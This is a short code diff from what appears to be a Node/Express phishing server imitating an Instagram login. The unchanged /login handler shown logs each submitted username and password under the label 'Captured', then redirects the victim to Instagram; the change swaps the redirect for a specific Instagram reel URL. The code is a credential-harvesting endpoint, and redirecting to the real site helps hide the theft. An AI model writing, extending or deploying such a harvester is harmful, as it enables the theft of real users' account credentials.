@@ -15,9 +15,10 @@ app.post("/login", (req, res) => {
   console.log(`Captured -> Username: ${username}, Password: ${password}`);
 
   // Redirect back (for demo purpose)
-  res.redirect("https://instagram.com");
+  res.redirect("https://www.instagram.com/reels/DLxRSD_TwsW");
 });
 
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
